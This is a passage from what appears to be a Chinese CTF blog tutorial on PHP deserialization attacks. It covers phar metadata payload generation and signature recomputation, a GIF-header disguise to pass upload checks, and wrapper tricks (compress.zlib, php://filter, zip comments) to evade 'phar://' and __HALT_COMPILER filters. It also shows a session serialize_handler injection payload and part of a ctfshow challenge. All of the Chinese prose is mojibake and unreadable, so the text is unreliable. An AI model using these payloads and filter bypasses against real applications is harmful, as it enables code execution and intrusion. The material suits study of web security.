<p>æ‰€ä»¥å¯ä»¥æ‰‹åŠ¨æ„é€ ä¸€ä¸ªåŒ…å«<code>__PHP__Incomplete_Class</code>çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå› ä¸ºæ˜¯æˆ‘ä»¬æ‰‹åŠ¨æ„é€ çš„ï¼Œæ‰€ä»¥<code>__PHP_Incomplete_Class_Name</code>å€¼ä¸ºç©ºï¼Œserializeæ‰¾ä¸åˆ°åä¼šè·³è¿‡ï¼Œä½†æ˜¯å±æ€§ä¸ªæ•°å‡ä¸€çš„æ­¥éª¤ä¸ä¼šè·³è¿‡ï¼Œæ‰€ä»¥æ„æˆäº†<code>serialize(unserialize($x)) != $x</code></p>
<p><img src="/img/summary/php_unserialize-15.png"></p>
<blockquote>
<p>æ³¨æ„ï¼šè‹¥ __PHP_Incomplete_Class å¯¹è±¡ä¸­çš„å±æ€§ä¸ªæ•°ä¸ºé›¶ï¼Œåˆ™ __PHP_Incomplete_Class çš„åºåˆ—åŒ–ç»“æœä¸­çš„å±æ€§ä¸ªæ•°æè¿°å€¼ä¹Ÿå°†ä¸ºé›¶</p>
</blockquote>
<h1 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h1><blockquote>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´çš„æ—¶å€™ï¼Œä¸€èˆ¬æ˜¯å°†åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¼ å…¥<code>unserialize()</code>æ¥åˆ©ç”¨ã€‚ä½†æ˜¯é€šè¿‡<code>phar</code>å¯ä»¥ä¸ä¾èµ–<code>unserialize()</code>ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p>
</blockquote>
<p>Pharæ˜¯PHPçš„å‹ç¼©æ–‡æ¡£ï¼Œæ˜¯PHPä¸­ç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚å®ƒå¯ä»¥æŠŠå¤šä¸ªæ–‡ä»¶å­˜æ”¾è‡³åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæ— éœ€è§£å‹ï¼ŒPHPå°±å¯ä»¥è¿›è¡Œè®¿é—®å¹¶æ‰§è¡Œå†…éƒ¨è¯­å¥ã€‚åœ¨PHP 5.3æˆ–æ›´é«˜ç‰ˆæœ¬ä¸­é»˜è®¤å¼€å¯</p>
<p>pharç»“æ„ç”±4éƒ¨åˆ†ç»„æˆ</p>
<p><strong>ä¸€ï¼šstub</strong></p>
<p>stubçš„åŸºæœ¬ç»“æ„ï¼š<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚ç±»ä¼¼äºPharçš„æ–‡ä»¶å¤´</p>
<p><strong>äºŒï¼šmanifest</strong></p>
<p>pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™é‡Œå°±æ˜¯æ¼æ´åˆ©ç”¨çš„å…³é”®ç‚¹</p>
<p><strong>ä¸‰ï¼šcontents</strong></p>
<p>è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹</p>
<p><strong>å››ï¼šsignature</strong></p>
<p>ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾</p>
<p>ç­¾è¯å°¾éƒ¨çš„01ä»£è¡¨md5åŠ å¯†ï¼Œ02ä»£è¡¨sha1åŠ å¯†ï¼Œ04ä»£è¡¨sha256åŠ å¯†ï¼Œ08ä»£è¡¨sha512åŠ å¯†</p>
<p><img src="/img/summary/php_unserialize-11.png"></p>
<p>ä¸€ä¸ªæœ€åŸºæœ¬çš„ä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;test.phar&quot;</span>);   <span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();  <span class="hljs-comment">//å¼€å§‹ç¼“å†²Pharå†™æ“ä½œ</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);   <span class="hljs-comment">//è®¾ç½®stub</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);  <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>(); <span class="hljs-comment">//åœæ­¢ç¼“å†²å¯¹ Phar å½’æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/php_unserialize-12.png"></p>
<p>phpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar:&#x2F;&#x2F;ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–<br>å—å½±å“çš„å‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">fileatime<br>filectime<br>file_exists<br>file_get_contents<br>file_put_contents<br>file<br>filegroup<br>fopen<br>fileinode<br>filemtime<br>fileowner<br>fileperms<br>is_dir<br>is_executable<br>is_file<br>is_link<br>is_readable<br>is_writable<br>is_writeable<br>parse_ini_file<br>copy<br>unlink<br>stat<br>readfile<br></code></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬ä¿®æ”¹æ–‡ä»¶çš„å†…å®¹æ—¶ï¼Œç­¾åå°±ä¼šå˜å¾—æ— æ•ˆï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦é‡æ–°è®¡ç®—ç­¾å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read()<br>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># è·å–è¦ç­¾åçš„æ•°æ®</span><br>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># è·å–ç­¾åç±»å‹å’ŒGBMBæ ‡è¯†</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf) <span class="hljs-comment"># å†™å…¥æ–°æ–‡ä»¶</span><br></code></pre></td></tr></table></figure>



<h2 id="pharç»•è¿‡ä¸Šä¼ é™åˆ¶"><a href="#pharç»•è¿‡ä¸Šä¼ é™åˆ¶" class="headerlink" title="pharç»•è¿‡ä¸Šä¼ é™åˆ¶"></a>pharç»•è¿‡ä¸Šä¼ é™åˆ¶</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;test.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/php_unserialize-13.png"></p>
<h2 id="ç»•è¿‡å¤´éƒ¨phar-x2F-x2F"><a href="#ç»•è¿‡å¤´éƒ¨phar-x2F-x2F" class="headerlink" title="ç»•è¿‡å¤´éƒ¨phar:&#x2F;&#x2F;"></a>ç»•è¿‡å¤´éƒ¨phar:&#x2F;&#x2F;</h2><p>å¦‚æœé¢˜ç›®é™åˆ¶äº†<code>phar://</code>ä¸èƒ½å‡ºç°åœ¨å¤´å‡ ä¸ªå­—ç¬¦ï¼Œå¯ä»¥ç”¨<code>Bzip/Gzip</code>åè®®ç»•è¿‡</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^php|^file|^phar|^dict|^zip/i&quot;</span>,<span class="hljs-variable">$filename</span>)&#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=phar://test.phar</span><br><span class="hljs-comment">//å³ä½¿ç”¨filterä¼ªåè®®æ¥è¿›è¡Œç»•è¿‡</span><br><br>compress.bzip2:<span class="hljs-comment">//phar:///test.phar/test.txt</span><br><span class="hljs-comment">//ä½¿ç”¨bzip2åè®®æ¥è¿›è¡Œç»•è¿‡</span><br><br>compress.zlib:<span class="hljs-comment">//phar:///home/sx/test.phar/test.txt</span><br><span class="hljs-comment">//ä½¿ç”¨zlibåè®®è¿›è¡Œç»•è¿‡</span><br></code></pre></td></tr></table></figure>


<h2 id="ç»•è¿‡-HALT-COMPILERæ£€æµ‹"><a href="#ç»•è¿‡-HALT-COMPILERæ£€æµ‹" class="headerlink" title="ç»•è¿‡__HALT_COMPILERæ£€æµ‹"></a>ç»•è¿‡__HALT_COMPILERæ£€æµ‹</h2><p>åœ¨å‰é¢ä»‹ç»stubæ—¶æåˆ°è¿‡ï¼ŒPHPé€šè¿‡<code>__HALT_COMPILER</code>æ¥è¯†åˆ«Pharæ–‡ä»¶ï¼Œé‚£ä¹ˆä¸ºäº†é˜²æ­¢Pharååºåˆ—åŒ–çš„å‡ºç°ï¼Œå¯èƒ½å°±ä¼šå¯¹è¿™ä¸ªè¿›è¡Œè¿‡æ»¤</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/HALT_COMPILER/i&quot;</span>,<span class="hljs-variable">$Phar</span>)&#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>ç»•è¿‡æ–¹æ³•ä¸€ï¼š</strong></p>
<p>å°†Pharæ–‡ä»¶çš„å†…å®¹å†™åˆ°å‹ç¼©åŒ…æ³¨é‡Šä¸­ï¼Œå‹ç¼©ä¸ºzipæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;phar.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;flag is here&#x27;</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>ç»•è¿‡æ–¹æ³•äºŒï¼š</strong></p>
<p>å°†ç”Ÿæˆçš„Pharæ–‡ä»¶è¿›è¡Œgzipå‹ç¼©ï¼Œå‹ç¼©ååŒæ ·ä¹Ÿå¯ä»¥è¿›è¡Œååºåˆ—åŒ–</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gzip test.phar<br></code></pre></td></tr></table></figure>



<h1 id="sessionååºåˆ—åŒ–"><a href="#sessionååºåˆ—åŒ–" class="headerlink" title="sessionååºåˆ—åŒ–"></a>sessionååºåˆ—åŒ–</h1><p>ä»€ä¹ˆæ˜¯sessionè¿™é‡Œå°±ä¸æè¿°äº†ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šæ–‡ç« å¯ä»¥å‚è€ƒ</p>
<p>å…ˆäº†è§£ä¸‹<code>PHP session</code>ä¸åŒå¼•æ“çš„å­˜å‚¨æœºåˆ¶</p>
<p><code>PHP session</code>çš„å­˜å‚¨æœºåˆ¶æ˜¯ç”±<code>session.serialize_handler</code>æ¥å®šä¹‰å¼•æ“çš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ï¼Œä¸”å­˜å‚¨çš„æ–‡ä»¶æ˜¯ç”±<code>sess_sessionid</code>æ¥å†³å®šæ–‡ä»¶åçš„</p>
<p>session.serialize_handlerå®šä¹‰çš„å¼•æ“å…±æœ‰ä¸‰ç§ï¼š</p>
<table>
<thead>
<tr>
<th>å¤„ç†å™¨åç§°</th>
<th>å­˜å‚¨æ ¼å¼</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_binary</td>
<td>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_serialize</td>
<td>ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„</td>
</tr>
</tbody></table>
<p>å½“<code>php</code>å’Œ<code>php_serialize</code>è¿™ä¸¤ä¸ªå¤„ç†åŒºæ··åˆèµ·æ¥ä½¿ç”¨ï¼Œå°±ä¼šå‡ºç°<code>session</code>ååºåˆ—åŒ–æ¼æ´ã€‚åŸå› æ˜¯<code>php_serialize</code>å­˜å‚¨çš„ååºåˆ—åŒ–å­—ç¬¦å¯ä»¥å¼•ç”¨<code>|</code>ï¼Œå¦‚æœè¿™æ—¶å€™ä½¿ç”¨<code>php</code>å¤„ç†å™¨çš„æ ¼å¼å–å‡º<code>$_SESSION</code>çš„å€¼ï¼Œ<code>|</code>ä¼šè¢«å½“æˆé”®å€¼å¯¹çš„åˆ†éš”ç¬¦ï¼Œåœ¨ç‰¹å®šçš„åœ°æ–¹ä¼šé€ æˆååºåˆ—åŒ–æ¼æ´</p>
<h2 id="SESSIONå˜é‡å¯æ§"><a href="#SESSIONå˜é‡å¯æ§" class="headerlink" title="$_SESSIONå˜é‡å¯æ§"></a>$_SESSIONå˜é‡å¯æ§</h2><p>ä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//1.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;session&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><br><br><span class="hljs-comment">//2.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å…ˆåœ¨<code>1.php</code>ä¼ å…¥<code>?session=lewiserii</code></p>
<p><code>session</code>çš„å†…å®¹ï¼Œå› ä¸º1.phpé¡µé¢ç”¨çš„æ˜¯<code>php_serialize</code>å¼•æ“ï¼Œæ‰€ä»¥æ˜¯åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„çš„å½¢å¼</p>
<p><img src="/img/summary/php_unserialize-1.png"></p>
<p>è€Œ2.phpç”¨çš„æ˜¯<code>php</code>å¼•æ“ï¼Œåœ¨å¯æ§ç‚¹ä¼ å…¥<code>|</code>+<code>åºåˆ—åŒ–å­—ç¬¦ä¸²</code>ï¼Œç„¶åå†æ¬¡è®¿é—®2.phpè°ƒç”¨sessionå€¼çš„æ—¶å€™ä¼šè§¦å‘</p>
<p>ä¼ å…¥<code>?session=|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:9:&quot;lewiserii&quot;;&#125;</code>åï¼Œæ–‡ä»¶ä¸­çš„å€¼å°±å˜æˆäº†ä¸‹å›¾ä¸­çš„å€¼</p>
<p><img src="/img/summary/php_unserialize-2.png"></p>
<p>å†æ¬¡è®¿é—®2.phpï¼Œå‘ç°æˆåŠŸååºåˆ—åŒ–ï¼Œä¿®æ”¹äº†<code>$name</code></p>
<p><img src="/img/summary/php_unserialize-3.png"></p>
<blockquote>
<p>æ€»ç»“ï¼šç”±äº1.phpæ˜¯ä½¿ç”¨php_serializeå¼•æ“å¤„ç†ï¼Œå› æ­¤åªä¼šæŠŠâ€™|â€™å½“åšä¸€ä¸ªæ­£å¸¸çš„å­—ç¬¦ã€‚ç„¶åè®¿é—®2.phpï¼Œç”±äºç”¨çš„æ˜¯phpå¼•æ“ï¼Œå› æ­¤é‡åˆ°â€™|â€™æ—¶ä¼šå°†ä¹‹çœ‹åšé”®åä¸å€¼çš„åˆ†å‰²ç¬¦ï¼Œä»è€Œé€ æˆäº†æ­§ä¹‰ï¼Œå¯¼è‡´å…¶åœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹â€™|â€™åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ã€‚</p>
</blockquote>
<h2 id="SESSIONå˜é‡ä¸å¯æ§"><a href="#SESSIONå˜é‡ä¸å¯æ§" class="headerlink" title="$_SESSIONå˜é‡ä¸å¯æ§"></a>$_SESSIONå˜é‡ä¸å¯æ§</h2><p>å½“<code>$_SESSION</code>ä¸èƒ½ç›´æ¥æ§åˆ¶æ—¶ï¼Œå¯ä»¥å€ŸåŠ©<code>PHP_SESSION_UPLOAD_PROGRESS</code>æ¥å®Œæˆååºåˆ—åŒ–</p>
<p>å…³äº<code>PHP_SESSION_UPLOAD_PROGRESS</code>çš„ä»‹ç»å¯ä»¥å‚è€ƒæˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« <a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93.html#session-upload-progress%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">session.upload_progressæ–‡ä»¶åŒ…å«</a></p>
<p>è¿™é‡Œç”¨ctfshowçš„ä¸€é“æ–°æ˜¥é¢˜çš„å‰åŠéƒ¨åˆ†ä½œä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;session.serialize_handler&quot;</span>, <span class="hljs-string">&quot;php&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$happy</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-variable">$happy</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$happy</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy=<span class="hljs-string">&quot;Happy_New_Year!!!&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;happy;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$funName</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;happy;<br>        &#125;<br><br><br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_New_</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$daniu</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$robot</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$notrobot</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_New_</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-string">&quot;I&#x27;m daniu.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;robot=<span class="hljs-string">&quot;I&#x27;m robot.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;notrobot=<span class="hljs-string">&quot;I&#x27;m not a robot.&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$funName</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu-&gt;<span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;notrobot;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;daniu;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$key</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br> &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Year</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$zodiac</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;zodiac.<span 